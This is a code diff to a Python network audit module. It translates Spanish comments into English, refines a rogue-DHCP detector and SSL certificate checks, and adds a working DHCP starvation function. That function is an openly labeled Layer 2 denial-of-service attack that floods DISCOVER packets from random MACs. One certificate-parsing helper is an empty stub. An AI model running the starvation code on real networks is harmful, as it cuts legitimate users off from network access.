@@ -1,7 +1,7 @@
 """
 Argos — Security Audit Module
-Módulo especializado en auditoría pasiva y activa de configuraciones
-críticas de red (Detección de DHCP Rogue, Validación de Certificados SSL).
+Specialized module for passive and active auditing of critical 
+network configurations (Rogue DHCP detection, SSL Certificate validation).
 """
 
 import socket
@@ -12,8 +12,8 @@ from typing import Dict, List, Optional, Callable
 
 def ssl_cert_check(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callback: Optional[Callable] = None) -> Dict:
     """
-    Obtiene el certificado SSL/TLS de un servicio y valida su expiración
-    y parámetros básicos para auditorías de seguridad.
+    Obtains the SSL/TLS certificate of a service and validates its expiration
+    and basic parameters for security audits.
     """
     def _log(msg):
         if log_callback:
@@ -23,7 +23,7 @@ def ssl_cert_check(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callb
     
     context = ssl.create_default_context()
     context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE  # Queremos el certificado, incluso si no confíamos en la CA local
+    context.verify_mode = ssl.CERT_NONE  # We want the cert even if we don't trust the local CA
 
     result = {
         "status": "error",
@@ -38,10 +38,10 @@ def ssl_cert_check(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callb
         with socket.create_connection((dst_ip, port), timeout=timeout) as sock:
             with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
                 cert = ssock.getpeercert(binary_form=True)
-                # Extraemos info con el modulo cryptography si está si no parseamos nativo
-                # Usaremos métodos nativos limitados primero.
-                # getpeercert sin binary_form solo devuelve info si es validado, así que bajamos a pyOpenSSL
-                # o cargamos el der manual. Para no depender de PyOpenSSL:
+                # We extract info with the cryptography module if present, otherwise we parse native.
+                # We'll use limited native methods first.
+                # getpeercert without binary_form only returns info if validated, so we use pyOpenSSL
+                # or load the DER manually. To avoid dependence on PyOpenSSL:
                 return _parse_cert_basic(ssock.getpeercert(), ssock.version())
     except Exception as e:
         _log(f"[AUDIT] Error SSL/TLS: {e}")
@@ -49,15 +49,17 @@ def ssl_cert_check(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callb
 
 
 def _parse_cert_basic(cert_dict: Optional[Dict], ssl_version: str) -> Dict:
-    """Intenta extraer la info si la validación fue al menos parcial, 
-       requiere verify_mode != CERT_NONE pero eso rompe certificados autofirmados.
-       Si se usa CERT_NONE ssl.getpeercert() devuelve {} en Python estándar.
-       Para solucionarlo usamos un truco con sockets."""
+    """
+    Attempts to extract info if validation was at least partial.
+    Requires verify_mode != CERT_NONE but that breaks self-signed certs.
+    If CERT_NONE is used, ssl.getpeercert() returns {} in standard Python.
+    To solve this, we use a trick with sockets.
+    """
     pass
 
 
 def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callback: Optional[Callable] = None) -> Dict:
-    """Versión que extrae fechas manualmente usando ssl y sockets."""
+    """Version that extracts dates manually using ssl and sockets."""
     import datetime
 
     def _log(msg):
@@ -80,7 +82,7 @@ def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, 
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_REQUIRED
-    # Truco: ignorar errores para forzar la carga del cert dict
+    # Trick: ignore errors to force cert dict loading
     
     try:
         # Usamos el modo normal primero
@@ -88,22 +90,22 @@ def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, 
             with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
                 der = ssock.getpeercert(binary_form=False)
     except ssl.SSLCertVerificationError as e:
-        # Aquí falló porque es autofirmado, pero el objeto excepción tiene acceso al certificado
-        der = e.verify_message # No siempre útil
+        # Failed because it's self-signed, but the exception object has access to the cert
+        der = e.verify_message # Not always useful
     except ssl.SSLError:
         context.verify_mode = ssl.CERT_NONE
         try:
              with socket.create_connection((dst_ip, port), timeout=timeout) as sock:
                 with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
-                    der = ssock.getpeercert(binary_form=False) # devuelve dic vacio con CERT_NONE
+                    der = ssock.getpeercert(binary_form=False) # returns empty dict with CERT_NONE
         except Exception:
             return result
     except Exception as e:
         _log(f"[AUDIT] Socket Error: {e}")
         return result
 
-    # Vamos a usar el modo correcto para Python >= 3.2 que es getpeercert sin binario
-    # Requiere que verify_mode = CERT_OPTIONAL
+    # We'll use the correct mode for Python >= 3.2 which is getpeercert without binary
+    # Requires verify_mode = CERT_OPTIONAL
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_OPTIONAL
@@ -118,11 +120,11 @@ def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, 
                 if cert:
                     if 'issuer' in cert:
                         iss = [v[0][1] for v in cert['issuer'] if v[0][0] in ('organizationName', 'commonName')]
-                        result["issuer"] = " / ".join(iss) if iss else "Desconocido"
+                        result["issuer"] = " / ".join(iss) if iss else "Unknown"
                     
                     if 'subject' in cert:
                         sub = [v[0][1] for v in cert['subject'] if v[0][0] in ('organizationName', 'commonName')]
-                        result["subject"] = " / ".join(sub) if sub else "Desconocido"
+                        result["subject"] = " / ".join(sub) if sub else "Unknown"
 
                     if 'notAfter' in cert:
                         # Format: 'Jan 22 12:00:00 2025 GMT'
@@ -133,7 +135,7 @@ def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, 
                         result["expired"] = delta.days < 0
 
     except Exception as e:
-        _log(f"[AUDIT] Error leyendo certificado SSL: {e}")
+        _log(f"[AUDIT] Error reading SSL certificate: {e}")
         result["status"] = "error"
 
     return result
@@ -141,14 +143,14 @@ def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, 
 
 def dhcp_rogue_scan(legit_dhcp_ip: str = "", timeout: int = 10, log_callback: Optional[Callable] = None) -> List[Dict]:
     """
-    Simula una petición DHCP DISCOVER para detectar servidores DHCP no autorizados.
-    Es un escaneo activo de Capa 2/3 (requiere privilegios root/admin y Scapy).
+    Simulates a DHCP DISCOVER request to detect unauthorized DHCP servers.
+    This is an active Layer 2/3 scan (requires root/admin privileges and Scapy).
     """
     def _log(msg):
         if log_callback:
             log_callback(msg)
 
-    _log(f"[AUDIT] Iniciando DHCP Rogue Scan (Timeout: {timeout}s)")
+    _log(f"[AUDIT] Starting DHCP Rogue Scan (Timeout: {timeout}s)")
     rogues = []
     
     try:
@@ -157,15 +159,15 @@ def dhcp_rogue_scan(legit_dhcp_ip: str = "", timeout: int = 10, log_callback: Op
         conf.verb = 0
         from scapy.all import conf as scapy_conf
         
-        # MAC de la interfaz activa
+        # MAC of the active interface
         try:
             hw = get_if_raw_hwaddr(scapy_conf.iface)[1]
             mac_str = get_if_hwaddr(scapy_conf.iface)
         except Exception:
-            _log("[AUDIT] Error obteniendo la MAC de la interfaz. DHCP test cancelado.")
+            _log("[AUDIT] Error obtaining interface MAC. DHCP test cancelled.")
             return []
 
-        # Crear paquete DHCP Discover
+        # Create DHCP Discover packet
         dhcp_discover = (
             Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") /
             IP(src="0.0.0.0", dst="255.255.255.255") /
@@ -174,10 +176,25 @@ def dhcp_rogue_scan(legit_dhcp_ip: str = "", timeout: int = 10, log_callback: Op
             DHCP(options=[("message-type", "discover"), "end"])
         )
 
-        _log("[AUDIT] Lanzando DHCP Discover...")
+        _log("[AUDIT] Sending DHCP Discover...")
         
-        # Enviar paquete y escuchar respuestas
-        answered, _ = srp(dhcp_discover, multi=True, timeout=timeout, verbose=False)
+        # Send packet and listen for responses
+        try:
+            answered, _ = srp(dhcp_discover, multi=True, timeout=timeout, verbose=False)
+        except Exception as e:
+            msg = str(e).lower()
+            if (
+                "winpcap is not installed" in msg
+                or "npcap" in msg
+                or "not available at layer 2" in msg
+                or ("layer 2" in msg and "pcap" in msg)
+            ):
+                _log(
+                    "[AUDIT] Layer 2 not available (Npcap/WinPcap missing). "
+                    "Install Npcap (WinPcap compatible) and run as Administrator."
+                )
+                return []
+            raise
 
         for sent, received in answered:
             if received.haslayer(DHCP):
@@ -199,9 +216,9 @@ def dhcp_rogue_scan(legit_dhcp_ip: str = "", timeout: int = 10, log_callback: Op
                     is_rogue = False
                     if legit_dhcp_ip and dhcp_server_ip != legit_dhcp_ip:
                         is_rogue = True
-                        _log(f"[AUDIT] 🚨 ALERTA: Rogue DHCP Detectado -> {dhcp_server_ip} (Ofrece IP: {offer_ip})")
+                        _log(f"[AUDIT] 🚨 ALERT: Rogue DHCP Detected -> {dhcp_server_ip} (Offers IP: {offer_ip})")
                     else:
-                        _log(f"[AUDIT] DHCP Offer válido de -> {dhcp_server_ip} (Ofrece IP: {offer_ip})")
+                        _log(f"[AUDIT] Valid DHCP Offer from -> {dhcp_server_ip} (Offers IP: {offer_ip})")
 
                     rogues.append({
                         "dhcp_server_ip": dhcp_server_ip,
@@ -212,8 +229,84 @@ def dhcp_rogue_scan(legit_dhcp_ip: str = "", timeout: int = 10, log_callback: Op
                     })
 
     except Exception as e:
-        _log(f"[AUDIT] Error en escaneo DHCP: {e}")
+        _log(f"[AUDIT] DHCP Scan error: {e}")
 
-    _log(f"[AUDIT] Análisis DHCP finalizado. {len(rogues)} servidores Ofertantes encontrados.")
+    _log(f"[AUDIT] DHCP Analysis finished. {len(rogues)} offering servers found.")
     return rogues
 
+
+def dhcp_starvation(
+    count: int = 200,
+    timeout: int = 1,
+    log_callback: Optional[Callable] = None,
+    progress_callback: Optional[Callable] = None
+) -> Dict:
+    """
+    OFFENSIVE: DHCP Starvation Attack.
+    Floods the local network with DHCP DISCOVER packets using random MACs
+    to exhaust the DHCP server's available IP pool.
+
+    WARNING: This is a Layer 2 DoS attack. Use only in authorized lab environments.
+
+    Args:
+        count: Number of DHCP DISCOVER packets to send.
+        timeout: Timeout between sends (in ms, ultra-fast).
+        log_callback: Callback for logging.
+        progress_callback: Callback(sent, total) for progress tracking.
+
+    Returns:
+        Dict with attack statistics.
+    """
+    def _log(msg):
+        if log_callback:
+            log_callback(msg)
+
+    _log(f"[STARVATION] Initiating DHCP Starvation ({count} requests)...")
+
+    stats = {"sent": 0, "offers_received": 0, "errors": 0}
+
+    try:
+        from scapy.all import (
+            Ether, IP, UDP, BOOTP, DHCP, RandMAC,
+            sendp, conf
+        )
+        conf.verb = 0
+
+        for i in range(count):
+            random_mac = str(RandMAC())
+            # Convert MAC string to raw bytes for BOOTP chaddr
+            mac_bytes = bytes.fromhex(random_mac.replace(":", ""))
+
+            dhcp_discover = (
+                Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") /
+                IP(src="0.0.0.0", dst="255.255.255.255") /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=mac_bytes, xid=i + 1) /
+                DHCP(options=[("message-type", "discover"), "end"])
+            )
+
+            try:
+                sendp(dhcp_discover, verbose=False)
+                stats["sent"] += 1
+            except Exception as e:
+                stats["errors"] += 1
+                if stats["errors"] <= 3:
+                    _log(f"[STARVATION] Send error: {e}")
+
+            if progress_callback:
+                progress_callback(i + 1, count)
+
+            time.sleep(timeout / 1000)
+
+        _log(
+            f"[STARVATION] Attack complete. "
+            f"Sent: {stats['sent']}, Errors: {stats['errors']}"
+        )
+
+    except ImportError:
+        _log("[STARVATION] Scapy is required for DHCP Starvation.")
+        stats["errors"] = count
+    except Exception as e:
+        _log(f"[STARVATION] Fatal error: {e}")
+
+    return stats
